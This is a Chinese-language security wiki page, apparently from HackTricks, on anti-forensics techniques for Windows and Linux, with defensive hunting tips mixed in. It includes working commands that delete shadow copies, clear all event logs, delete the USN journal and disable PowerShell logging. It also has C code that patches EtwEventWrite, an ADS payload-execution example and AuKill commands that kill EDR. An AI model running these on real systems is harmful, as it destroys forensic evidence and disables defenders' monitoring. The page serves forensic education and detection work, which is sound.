# 反取证技术

{{#include ../../banners/hacktricks-training.md}}

## 时间戳

攻击者可能会对**文件的时间戳进行更改**以避免被检测。\
可以在MFT中的属性`$STANDARD_INFORMATION` \_\_ 和 \_\_ `$FILE_NAME`中找到时间戳。

这两个属性都有4个时间戳：**修改**、**访问**、**创建**和**MFT注册修改**（MACE或MACB）。

**Windows资源管理器**和其他工具显示来自**`$STANDARD_INFORMATION`**的信息。

### TimeStomp - 反取证工具

该工具**修改****`$STANDARD_INFORMATION`**中的时间戳信息**但**不修改****`$FILE_NAME`**中的信息。因此，可以**识别****可疑****活动**。

### Usnjrnl

**USN日志**（更新序列号日志）是NTFS（Windows NT文件系统）的一个特性，用于跟踪卷更改。[**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv)工具允许检查这些更改。

![](<../../images/image (801).png>)

上图是**工具**显示的**输出**，可以观察到对文件进行了**某些更改**。

### $LogFile

**对文件系统的所有元数据更改都会被记录**，这一过程称为[预写日志](https://en.wikipedia.org/wiki/Write-ahead_logging)。记录的元数据保存在名为`**$LogFile**`的文件中，该文件位于NTFS文件系统的根目录。可以使用[LogFileParser](https://github.com/jschicht/LogFileParser)等工具解析此文件并识别更改。

![](<../../images/image (137).png>)

同样，在工具的输出中可以看到**某些更改已被执行**。

使用同一工具可以识别**时间戳被修改到哪个时间**：

![](<../../images/image (1089).png>)

- CTIME: 文件创建时间
- ATIME: 文件修改时间
- MTIME: 文件的MFT注册修改
- RTIME: 文件访问时间

### `$STANDARD_INFORMATION`和`$FILE_NAME`比较

识别可疑修改文件的另一种方法是比较两个属性的时间，寻找**不匹配**。

### 纳秒

**NTFS**时间戳的**精度**为**100纳秒**。因此，找到时间戳像2010-10-10 10:10:**00.000:0000的文件是非常可疑的**。

### SetMace - 反取证工具

该工具可以修改两个属性`$STARNDAR_INFORMATION`和`$FILE_NAME`。然而，从Windows Vista开始，必须在活动操作系统中修改此信息。

## 数据隐藏

NFTS使用集群和最小信息大小。这意味着如果一个文件占用一个半集群，**剩下的半个集群将永远不会被使用**，直到文件被删除。因此，可以在这个松弛空间中**隐藏数据**。

有像slacker这样的工具可以在这个“隐藏”空间中隐藏数据。然而，对`$logfile`和`$usnjrnl`的分析可以显示某些数据已被添加：

![](<../../images/image (1060).png>)

然后，可以使用FTK Imager等工具检索松弛空间。请注意，这种工具可以保存内容为模糊或甚至加密的形式。

## UsbKill

这是一个工具，如果检测到USB端口的任何更改，将**关闭计算机**。\
发现这一点的一种方法是检查正在运行的进程并**审查每个正在运行的python脚本**。

## 实时Linux发行版

这些发行版在**RAM**内存中**执行**。检测它们的唯一方法是**在NTFS文件系统以写入权限挂载的情况下**。如果仅以读取权限挂载，则无法检测到入侵。

## 安全删除

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows配置

可以禁用多种Windows日志记录方法，以使取证调查变得更加困难。

### 禁用时间戳 - UserAssist

这是一个注册表项，维护用户运行每个可执行文件的日期和时间。

禁用UserAssist需要两个步骤：

1. 设置两个注册表项，`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs`和`HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`，都设置为零，以表示我们希望禁用UserAssist。
2. 清除看起来像`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`的注册表子树。

### 禁用时间戳 - Prefetch

这将保存有关执行的应用程序的信息，目的是提高Windows系统的性能。然而，这对于取证实践也可能有用。

- 执行`regedit`
- 选择文件路径`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- 右键单击`EnablePrefetcher`和`EnableSuperfetch`
- 选择修改，将每个值从1（或3）更改为0
- 重启

### 禁用时间戳 - 最后访问时间

每当从Windows NT服务器上的NTFS卷打开文件夹时，系统会花时间**更新每个列出文件夹的时间戳字段**，称为最后访问时间。在使用频繁的NTFS卷上，这可能会影响性能。

1. 打开注册表编辑器（Regedit.exe）。
2. 浏览到`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`。
3. 查找`NtfsDisableLastAccessUpdate`。如果不存在，请添加此DWORD并将其值设置为1，这将禁用该过程。
4. 关闭注册表编辑器，并重启服务器。

### 删除USB历史记录

所有**USB设备条目**都存储在Windows注册表中的**USBSTOR**注册表项下，该项包含在您将USB设备插入PC或笔记本电脑时创建的子键。您可以在这里找到此键`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`。**删除此项**将删除USB历史记录。\
您还可以使用工具[**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html)确保您已删除它们（并删除它们）。

另一个保存USB信息的文件是`C:\Windows\INF`中的`setupapi.dev.log`。这也应该被删除。

### 禁用影子副本

**列出**影子副本使用`vssadmin list shadowstorage`\
**删除**它们运行`vssadmin delete shadow`

您还可以通过GUI删除它们，按照[https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)中提出的步骤进行操作。

要禁用影子副本，请[按照此处的步骤](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows)：

1. 通过在点击Windows开始按钮后在文本搜索框中输入“services”打开服务程序。
2. 从列表中找到“卷影复制”，选择它，然后右键单击访问属性。
3. 从“启动类型”下拉菜单中选择禁用，然后通过点击应用和确定确认更改。

还可以在注册表`HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`中修改将要在影子副本中复制的文件的配置。

### 覆盖已删除文件

- 您可以使用**Windows工具**：`cipher /w:C`这将指示cipher从C驱动器的可用未使用磁盘空间中删除任何数据。
- 您还可以使用像[**Eraser**](https://eraser.heidi.ie)这样的工具。

### 删除Windows事件日志

- Windows + R --> eventvwr.msc --> 展开“Windows日志” --> 右键单击每个类别并选择“清除日志”
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### 禁用Windows事件日志

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- 在服务部分禁用“Windows事件日志”服务
- `WEvtUtil.exec clear-log`或`WEvtUtil.exe cl`

### 禁用$UsnJrnl

- `fsutil usn deletejournal /d c:`

---

## 高级日志记录与跟踪篡改（2023-2025）

### PowerShell脚本块/模块日志记录

Windows 10/11和Windows Server的最新版本在`Microsoft-Windows-PowerShell/Operational`（事件4104/4105/4106）下保留**丰富的PowerShell取证文物**。攻击者可以实时禁用或清除它们：
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
防御者应监控这些注册表项的更改以及大量删除 PowerShell 事件。

### ETW (Windows 事件追踪) 补丁

终端安全产品在很大程度上依赖于 ETW。一个流行的 2024 年规避方法是在内存中补丁 `ntdll!EtwEventWrite`/`EtwEventWriteFull`，使每个 ETW 调用返回 `STATUS_SUCCESS` 而不发出事件：
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
公共 PoCs（例如 `EtwTiSwallow`）在 PowerShell 或 C++ 中实现相同的原语。由于补丁是 **进程本地** 的，运行在其他进程中的 EDR 可能会错过它。检测：比较内存中的 `ntdll` 与磁盘上的 `ntdll`，或在用户模式之前进行钩子。

### 备用数据流 (ADS) 复兴

2023 年的恶意软件活动（例如 **FIN12** 加载程序）已被发现将第二阶段二进制文件放置在 ADS 中，以避免传统扫描器的检测：
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
使用 `dir /R`、`Get-Item -Stream *` 或 Sysinternals `streams64.exe` 枚举流。
将主机文件复制到 FAT/exFAT 或通过 SMB 将删除隐藏流，并可被调查人员用于恢复有效负载。

### BYOVD & “AuKill” (2023)

自带易受攻击驱动程序（Bring-Your-Own-Vulnerable-Driver）现在在勒索软件入侵中常用于 **反取证**。
开源工具 **AuKill** 加载一个已签名但易受攻击的驱动程序 (`procexp152.sys`)，以在 **加密和日志销毁之前** 暂停或终止 EDR 和取证传感器：
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
驱动程序随后被移除，留下最小的痕迹。  
缓解措施：启用 Microsoft 脆弱驱动程序黑名单 (HVCI/SAC)，并对来自用户可写路径的内核服务创建进行警报。

---

## Linux 反取证：自我修补和云 C2 (2023–2025)

### 自我修补被攻陷的服务以减少检测 (Linux)  
对手越来越多地在利用服务后立即“自我修补”，以防止重新利用并抑制基于漏洞的检测。其思路是用最新的合法上游二进制文件/JAR 替换脆弱组件，从而使扫描器报告主机已修补，同时保持持久性和 C2。

示例：Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604)  
- 后利用阶段，攻击者从 Maven Central (repo1.maven.org) 获取合法的 JAR，删除 ActiveMQ 安装中的脆弱 JAR，并重启代理。  
- 这关闭了初始 RCE，同时保持其他立足点 (cron、SSH 配置更改、单独的 C2 植入)。

操作示例（说明性）
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
法医/狩猎技巧
- 检查服务目录以寻找未计划的二进制/JAR 替换：
- Debian/Ubuntu: `dpkg -V activemq` 并与仓库镜像比较文件哈希/路径。
- RHEL/CentOS: `rpm -Va 'activemq*'`
- 查找磁盘上存在但不被包管理器拥有的 JAR 版本，或已更新的符号链接。
- 时间线：`find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` 以关联 ctime/mtime 与妥协窗口。
- Shell 历史/进程遥测：在初始利用后立即有证据表明使用了 `curl`/`wget` 访问 `repo1.maven.org` 或其他工件 CDN。
- 变更管理：验证谁应用了“补丁”以及原因，而不仅仅是确认存在已修补版本。

### 带有持有者令牌和反分析启动程序的云服务 C2
观察到的交易技巧结合了多个长期 C2 路径和反分析打包：
- 密码保护的 PyInstaller ELF 加载程序以阻碍沙箱和静态分析（例如，加密的 PYZ，临时提取到 `/_MEI*` 下）。
- 指标：`strings` 命中如 `PyInstaller`、`pyi-archive`、`PYZ-00.pyz`、`MEIPASS`。
- 运行时工件：提取到 `/tmp/_MEI*` 或自定义 `--runtime-tmpdir` 路径。
- 使用硬编码 OAuth Bearer 令牌的 Dropbox 支持的 C2
- 网络标记：`api.dropboxapi.com` / `content.dropboxapi.com`，带有 `Authorization: Bearer <token>`。
- 在代理/NetFlow/Zeek/Suricata 中搜索来自不正常同步文件的服务器工作负载的 Dropbox 域的出站 HTTPS。
- 通过隧道进行并行/备份 C2（例如，Cloudflare Tunnel `cloudflared`），在一个通道被阻止时保持控制。
- 主机 IOCs：`cloudflared` 进程/单元，配置在 `~/.cloudflared/*.json`，出站 443 到 Cloudflare 边缘。

### 持久性和“加固回滚”以维持访问（Linux 示例）
攻击者经常将自我修补与持久访问路径配对：
- Cron/Anacron：在每个 `/etc/cron.*/` 目录中编辑 `0anacron` 存根以进行定期执行。
- 搜索：
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH 配置加固回滚：启用 root 登录并更改低权限帐户的默认 shell。
- 搜索 root 登录启用：
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# 标志值如 "yes" 或过于宽松的设置
```
- 搜索系统帐户上的可疑交互式 shell（例如，`games`）：
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- 随机、短名称的信标工件（8 个字母字符）被写入磁盘并联系云 C2：
- 搜索：
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

防御者应将这些工件与外部暴露和服务补丁事件关联，以揭示用于隐藏初始利用的反取证自我修复。

## 参考文献

- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (2023年3月)
https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (2024年6月)
https://redcanary.com/blog/etw-patching-detection

- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)

{{#include ../../banners/hacktricks-training.md}}
